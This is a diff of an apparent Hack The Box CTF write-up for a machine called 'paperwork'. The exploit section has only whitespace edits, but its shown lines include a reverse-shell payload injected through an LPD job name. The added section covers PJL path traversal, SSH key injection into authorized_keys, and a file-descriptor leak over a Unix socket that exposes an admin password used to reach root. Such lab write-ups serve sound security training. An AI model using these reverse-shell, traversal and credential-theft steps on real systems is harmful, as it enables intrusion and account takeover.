@@ -153,11 +153,11 @@ print('[+] Exploit sent!')
 ```
 
 ### Exploitation Sequence
-Step 1 - Queue Initialization: Sends the print job submission command (\x02) with the valid queue name archive_intake. The sleep allows server processing, and recv() consumes the server's ACK.
-Step 2 - Payload Header: Constructs the job name string beginning with J (LPD marker), followed by a single quote that closes the echo string in the vulnerable subprocess. The bash command creates an interactive reverse shell via /dev/tcp. The header contains the submission command, payload size in ASCII, and newline delimiter.
-Step 3 - Send Payload: Transmits the actual payload. The server extracts the job name by searching for the line starting with J.
-Step 4 - Finalize: Sends the LPD "end of job" command (\x03), triggering server-side processing of the malicious payload.
-
+Step 1 - Queue Initialization: Sends the print job submission command (\x02) with the valid queue name archive_intake. The sleep allows server processing, and recv() consumes the server's ACK.  
+Step 2 - Payload Header: Constructs the job name string beginning with J (LPD marker), followed by a single quote that closes the echo string in the vulnerable subprocess. The bash command creates an interactive reverse shell via /dev/tcp. The header contains the submission command, payload size in ASCII, and newline delimiter.  
+Step 3 - Send Payload: Transmits the actual payload. The server extracts the job name by searching for the line starting with J.  
+Step 4 - Finalize: Sends the LPD "end of job" command (\x03), triggering server-side processing of the malicious payload.  
+ 
 The extracted job_name is:  
 ```
 '; bash -c "bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1" #  
@@ -177,22 +177,224 @@ python exploit.py
 ```
 A reverse shell prompt appears connected as the ** user.
 
+### Lateral Movement to User A********
+#### Port 9100 Service Discovery
+While exploring the compromised system as the ** user, port scanning revealed an additional service:
+```
+ss -tulnp
+Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess                          
+udp   UNCONN 0      0         127.0.0.54:53        0.0.0.0:*                                    
+udp   UNCONN 0      0      127.0.0.53%lo:53        0.0.0.0:*                                    
+udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*                                    
+udp   UNCONN 0      0          127.0.0.1:323       0.0.0.0:*                                    
+udp   UNCONN 0      0              [::1]:323          [::]:*                                    
+tcp   LISTEN 0      4096      127.0.0.54:53        0.0.0.0:*                                    
+tcp   LISTEN 0      100        127.0.0.1:9100      0.0.0.0:*                                    
+tcp   LISTEN 0      100          0.0.0.0:1515      0.0.0.0:*    users:(("python3",pid=984,fd=3))
+tcp   LISTEN 0      4096         0.0.0.0:22        0.0.0.0:*                                    
+tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*                                    
+tcp   LISTEN 0      4096   127.0.0.53%lo:53        0.0.0.0:*                                    
+tcp   LISTEN 0      128        127.0.0.1:1337      0.0.0.0:*                                    
+tcp   LISTEN 0      4096            [::]:22           [::]:*
+```
+Process enumeration showed this service was running as the a******** user:
+```
+ps aux | grep -i 9100
+ps aux | grep -i 9100
+a*****+     981  0.0  0.4  28040 17448 ?        Ss   13:51   0:00 /usr/bin/python3 /home/a********/printer/jetdirect.py 9100 /home/a********/printer/ /home/a********/printer/logs/commands.log
+lp          1939  0.0  0.2  25916 11424 pts/2    S+   15:17   0:00 curl -sk 127.0.0.1:9100
+lp          1949  0.0  0.0   7560  3524 pts/3    S+   15:18   0:00 telnet 127.0.0.1 9100
+lp          1955  0.0  0.0   7560  3516 pts/4    S+   15:19   0:00 telnet 127.0.0.1 9100
+lp          1971  0.0  0.0   7560  3528 pts/5    S+   15:22   0:00 telnet 127.0.0.1 9100
+lp          1978  0.0  0.0   7560  3540 pts/6    S+   15:24   0:00 telnet 127.0.0.1 9100
+lp          1992  0.0  0.0   6864  2512 pts/7    S+   15:25   0:00 grep -i 9100
+```
+The jetdirect.py script implements a printer emulation service using Printer Job Language (PJL) protocol.  
+#### JetDirect PJL Path Traversal
+Connecting to the JetDirect service revealed it processes PJL commands for filesystem operations:  
+```
+telnet 127.0.0.1 9100
+Trying 127.0.0.1...
+Connected to 127.0.0.1.
+Escape character is '^]'.
+@PJL INFO ID
+HP LASERJET 4ML
+@PJL INFO STATUS
+OK
+@PJL INFO VARIABLES
+OK
+@PJL INFO FILESYS
+VOLUME TOTAL SIZE FREE SPACE LOCATION LABEL STATUS
+0:     1755136    1718272    <HT>     <HT>  READ-WRITE
+@PJL FSDIRLIST NAME="0:\"
+. TYPE=DIR
+.. TYPE=DIR
+logs TYPE=DIR SIZE=4096
+jetdirect.py TYPE=FILE SIZE=5119
+```
+The service uses a filesystem abstraction prefixed with 0:\, where 0: represents a virtual drive root.  
+Path Traversal Vulnerability: By using relative path traversal sequences (0:\..), it was possible to escape the intended directory and access parent directories:  
+
+```
+@PJL FSDIRLIST NAME="0:\..\"
+. TYPE=DIR
+.. TYPE=DIR
+.cache TYPE=DIR SIZE=4096
+.bashrc TYPE=FILE SIZE=3771
+.local TYPE=DIR SIZE=4096
+.ssh TYPE=DIR SIZE=4096
+.profile TYPE=FILE SIZE=807
+.lesshst TYPE=FILE SIZE=20
+.bash_history TYPE=FILE SIZE=0
+user.txt TYPE=FILE SIZE=33
+.bash_logout TYPE=FILE SIZE=220
+.gnupg TYPE=DIR SIZE=4096
+printer TYPE=DIR SIZE=4096
+```
+
+So we grabbed the user.txt flag: 
+```
+@PJL FSUPLOAD NAME="0:\..\user.txt" SIZE=33
+c******************************2
+```
+#### SSH Key Injection via Path Traversal
+Using the @PJL FSDOWNLOAD command with path traversal, it was possible to write directly to the authorized_keys file.  
+
+The exploit sequence:  
+Send the FSDOWNLOAD command with path traversal to target the SSH key file:  
+```
+@PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE=91
+```
+Press ENTER. 
+Paste the attacker's public key:
+ssh-ed25519 A******************************************************************E kali@kali
+Press ENTER to finalize the write operation and the server gives OK back.  
+
+The JetDirect service processes the FSDOWNLOAD command and writes the pasted content directly into /home/a********/.ssh/authorized_keys, effectively injecting the attacker's public key into the file.  
+
+#### SSH Access as A********:  
+
+With the public key now present in authorized_keys:
+```
+ssh -i id_ed25519 a********@paperwork.htb 
+```
+As A******** we ran linpeas.sh and we found something a juicy custom unix socket, owned by root:  
+```
+╔══════════╣ Unix Sockets Analysis (T1571,T1049)
+╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sockets                                   
+/run/dbus/system_bus_socket                                                                                                 
+  └─(Read Write (Weak Permissions: 666) )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+/run/paperwork/mgmt.sock
+  └─(Read Write )
+  └─(Owned by root)
+  └─High risk: root-owned and writable Unix socket
+[...]
+```
+
+Unlike the standard system sockets, this one appeared to belong to the custom Paperwork application. Connecting to it with socat returned the message:  
+
+ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED  
 
 
 
+```
+ss -xlp | grep paperwork # search for socket
+u_str LISTEN 0      5                             /run/paperwork/mgmt.sock 13948            * 0 
+```
+Connecting to the socket with socat produced an interesting response:  
+```
+socat - UNIX-CONNECT:/run/paperwork/mgmt.sock
+ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.
+```
+However, a simple Python client only received:
+```
+import socket
+s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+s.connect("/run/paperwork/mgmt.sock")
+print(s.recv(4096))
 
+# Output: 
+b'STATUS: SYSTEM_CLEAN
+SIGNATURE: d92938059e3e5371cf54db65d60963aecacedf69e493c44a8b618036b07cbdbe'
+```
+The different responses suggested that the daemon entered a special "forensic" mode only under specific conditions.  
+I identified the process handling the socket:  
+```
+ps -ef | grep paperwork
+root 1481 1 0 ? 00:00:00 /usr/bin/python3 /usr/bin/paperwork-daemon
+```
+The script was world-readable, so I inspected it:
+```head -100 /usr/bin/paperwork-daemon```
 
+The source code revealed that it opened /etc/paperwork/admin_pins.conf as root at startup:
+```admin_fd = os.open("/etc/paperwork/admin_pins.conf", os.O_RDONLY)```
+It also monitored the printer log:    
+```LOG_PATH = "/home/a********/printer/logs/commands.log"```
+Whenever the log contained any of the strings:  
+```
+FSQUERY
+FSUPLOAD
+FSDOWNLOAD
+```
+the daemon executed:
+```
+trigger_lockdown(conn)
+```
+Inside this function, it leaked two file descriptors using sendmsg() and SCM_RIGHTS:  
+```
+evidence_bundle = array.array("i", [log_fd, admin_fd])
 
+conn.sendmsg(
+    [msg],
+    [(socket.SOL_SOCKET, socket.SCM_RIGHTS, evidence_bundle)]
+)
+```
+To trigger this condition, I sent a PJL command to the vulnerable JetDirect service:  
+```
+@PJL FSQUERY NAME="0:\jetdirect.py"
+```
+Then I connected again to the management socket using a Python client capable of receiving ancillary data:  
+```
+cat exploit.py
+import socket, array, os
+sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
+sock.connect("/run/paperwork/mgmt.sock")
+fds = array.array("i")
+msg, ancdata, flags, _ = sock.recvmsg(4096, socket.CMSG_SPACE(2 * fds.itemsize))
+print(msg)
+for level, ctype, data in ancdata:
+    if level == socket.SOL_SOCKET and ctype == socket.SCM_RIGHTS:
+        fds.frombytes(data)
+for fd in fds:
+    os.lseek(fd, 0, os.SEEK_SET)
+    print(os.read(fd, 4096).decode())
+```
+This returned the leaked file descriptors. One of them referenced /etc/paperwork/admin_pins.conf, allowing me to read the administrator credentials directly from the already-open file descriptor.  
+```
+python exploit.py
+b'ALERT: SECURITY_VIOLATION. FORENSIC_CONTEXT_ATTACHED.'
+array('i', [4, 5])
+FD 4
+Listening on port 9100
+[...]
+Listening on port 9100
+[127.0.0.1] connected
+Command: @PJL FSDOWNLOAD NAME="../.ssh/authorized_keys" SIZE=91
+Receiving file: ../.ssh/authorized_keys (91 bytes)
+[127.0.0.1] connected
+Command: @PJL FSQUERY NAME="0:\jetdirect.py"
 
+FD 5
+ADMIN_PASSWORD=A********************2
 
+a********@paperwork:/tmp$ su root
+Password: 
+root@paperwork:~# cat /root/root.txt 
+d******************************0
+```
+With the recovered administrator password, I authenticated as root and cat the root flag.
 
-
-
-
-
-
-
-
-
-
+Cyall.
 
